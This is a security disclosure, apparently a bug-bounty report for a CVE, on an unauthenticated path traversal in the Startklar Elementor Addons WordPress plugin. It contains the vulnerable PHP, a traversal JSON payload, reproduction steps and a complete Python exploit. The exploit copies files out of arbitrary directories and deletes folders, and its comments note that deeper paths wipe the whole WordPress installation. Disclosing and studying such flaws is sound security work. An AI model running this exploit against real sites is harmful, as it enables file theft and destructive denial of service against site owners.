# Post Report Info

- Link: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/startklar-elmentor-forms-extwidgets/startklar-elementor-addons-1715-unauthenticated-path-traversal-to-arbitrary-directory-deletion
- CVE: 2024-5153
- Bounty: $361

# Startklar Elementor Addons Unauthenticated Arbitrary File Read and Folder Deletion

The Startklar Elementor Addons plugin version: 1.7.15 is vulnerable to an Unauthenticated Path Traversal when a form with a DropZone file upload is used. This path traversal can be chained to perform 1. File Copies, potentially exposing sensitive files by placing a copy in the uploads directories and 2. Folder Deletions, causing denial of service.

## Affected Plugin

Title: Startklar Elementor Addons
Active installations: 4,000
Version: 1.7.15
Slug: startklar-elmentor-forms-extwidgets
Link: https://wordpress.org/plugin/startklar-elmentor-forms-extwidgets/

## Root Cause

### 1. dropzone_form_field.php 

In [widgets/dropzone_form_field.php](https://plugins.trac.wordpress.org/browser/startklar-elmentor-forms-extwidgets/trunk/widgets/dropzone_form_field.php) the user-controllable parameter `dropzone_hash` is vulnerable to path traversal allowing file copying and folder deletion. Inside the `sanitize_field` function user-controllable JSON is decoded and the `dropzone_hash` is obtained:

```php
$options = json_decode($value, true);

if (!empty($options["dropzone_hash"])) {
    $dropzone_hash = $options["dropzone_hash"];
}
```

This is then used to copy all the files inside of this temporary folder to a more permanent one: 

```php
$target_folder = $uploads_dir_info['basedir'] . "/elementor/forms/" . $user_id . "/temp/" . $options["dropzone_hash"] . "/*";
$files = glob($target_folder);

if (count($files)) {
    foreach ($files as $file) {
    ...
    copy($file, $new_path);
```

Following the copying logic the temporary folder is deleted:

```php
$temp_folder = $uploads_dir_info['basedir'] . "/elementor/forms/" . $user_id . "/temp/" . $options["dropzone_hash"];
require_once(ABSPATH . "wp-admin/includes/class-wp-filesystem-base.php");
require_once(ABSPATH . "wp-admin/includes/class-wp-filesystem-direct.php");
$WP_Filesystem_Direct = new \WP_Filesystem_Direct(null);
@$WP_Filesystem_Direct->delete($temp_folder, true);
```

The payload we can use will look like the following JSON:

```json
{
    "files_amount": 1,
    "allowed_file_types_for_upload": ".jpg, .pdf, .png",
    "maximum_upload_file": 10,
    "path_type": "abs_path",
    "dropzone_hash": "../../../../../"
}
```

## Proof of Concept

Note: If your WordPress instance is not setup to send mail correctly this plugin will crash trying to submit forms. This can be fixed by creating a dummy sendmail binary with the following command `touch /usr/sbin/sendmail && chmod +x /usr/sbin/sendmail`.

1. Install and activate `elementor`, `elementor-pro` and `startklar-elmentor-forms-extwidgets` plugins
2. Create a new post with elementor and add a form and ensure it has a DropZone field
    * Add New Post
    * Edit with Elementor
    * Add Form Widget
    * Add Item > Type DropZone field
    * Publish and note the page id
3. Modify the payload to match your target
```
TARGET = 'http://wordpress.local:1337'
POST_ID = 15
PATH = '../../../'
# ../../../          = /wp-content/uploads/elementor
# ../../../../       = /wp-content/uploads/
# ../../../../../    = /wp-content/
# ../../../../../../ = / (root WordPress dir)
# Note that the first two are recoverable, but the latter few are prob going to destroy your WordPress instance.
```
4. Run the PoC, note that `../../../../../../` is the most obvious as it will delete the all WordPress files and crash...

```
❯ python3 exploit.py
[+] Form ID: f0afb84
[+] Field ID: field_aa0b5ec

<p>There has been a critical error on this website.</p><p><a href="https://wordpress.org/documentation/article/faq-troubleshooting/">Learn more about troubleshooting WordPress.</a></p>
```

5. Note that while this payload will delete the target folder (or attempt to), it will also copy all files into the uploads folder first. So this can be used to exfiltrate files from other directories.

### Python PoC

```python
import re
from io import BytesIO

import requests

"""
Author: Mat Rollings (stealthcopter)
Website: sec.stealthcopter.com
"""

TARGET = 'http://wordpress.local:1337'
POST_ID = 15
PATH = '../../../../../pyslurper/'
# ../../../          = /wp-content/uploads/elementor
# ../../../../       = /wp-content/uploads/
# ../../../../../    = /wp-content/
# ../../../../../../ = / (root WordPress dir)
# Note that the first two are recoverable, but the latter few are prob going to destroy your WordPress instance.

session = requests.session()


# Proxy can be uncommented here for debugging:
# session.proxies = {'http': 'http://localhost:8080'}


def dummy_upload(field_id):
   # Create a fake JPG file in memory
   fake_file = BytesIO(b'AAAA')
   fake_file.name = 'hello.jpg'

   files = {
      'file': ('hello.jpg', fake_file, 'image/jpeg')
   }
   data = {
      'hash_961': field_id
   }

   response = requests.post(f'{TARGET}/wp-admin/admin-ajax.php?action=startklar_drop_zone_upload_process', files=files,
                            data=data)

   print(response.text)


def get_form_id(post_id):
   r = session.get(f'{TARGET}/?p={post_id}')
   nonce_pattern = r'name="form_id" value="([a-zA-Z0-9]+)"'
   nonce = re.search(nonce_pattern, r.text)
   return nonce.group(1)


def get_field_id(post_id):
   r = session.get(f'{TARGET}/?p={post_id}')
   nonce_pattern = r'name="form_fields\[(field_[a-zA-Z0-9]+)\]"'
   nonce = re.search(nonce_pattern, r.text)
   return nonce.group(1)


def do_delete(post_id, form_id, field_id, path):
   data = {
      'action': 'elementor_pro_forms_send_form',
      'post_id': post_id,
      'queried_id': post_id,
      'form_id': form_id,
      f'form_fields[{field_id}]': '{"files_amount":1,"allowed_file_types_for_upload":".jpg, .pdf, .png, .php","maximum_upload_file":10,"path_type":"abs_path","dropzone_hash":"' + path + '"}',
   }

   r = session.post(f'{TARGET}/wp-admin/admin-ajax.php', data=data)

   print(r.text)


def exploit():
   form_id = get_form_id(POST_ID)
   if not form_id:
      print('[!] Error could not get form id')
      return False

   print(f'[+] Form ID: {form_id}')

   field_id = get_field_id(POST_ID)
   if not field_id:
      print('[!] Error could not get field id')
      return False

   print(f'[+] Field ID: {field_id}')

   # Need a dummy upload so that the path exists...
   dummy_upload(field_id)

   do_delete(POST_ID, form_id, field_id, PATH)


exploit()
```